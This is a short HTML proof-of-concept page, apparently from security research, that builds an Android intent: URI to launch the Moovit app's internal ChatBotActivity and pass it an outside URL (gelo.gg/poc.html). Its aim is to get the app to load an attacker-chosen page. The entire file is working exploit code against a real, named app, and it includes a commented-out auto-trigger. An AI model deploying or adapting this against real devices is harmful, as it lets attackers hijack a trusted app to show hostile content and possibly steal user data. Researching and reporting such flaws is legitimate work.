<!DOCTYPE html>
<html>
<body>
    <h1>Attempting to Pivot...</h1>
    <button onclick="launchChatBot()">Click to Launch ChatBot Activity</button>
    
    <script>
        function launchChatBot() {
            // We attempt to call the ChatBotActivity explicitly.
            // We pass a 'url' extra in case the parent class accepts it (common in Moovit apps).
            
            var target = "intent:#Intent;" + 
                         "component=com.tranzmate/com.moovit.app.chatbot.ChatBotActivity;" + 
                         "S.url=https://www.gelo.gg/poc.html;" + 
                         "end";
                         
            window.location.href = target;
        }
        
        // Auto-trigger for convenience (optional)
        // setTimeout(launchChatBot, 1000);
    </script>
</body>
</html>
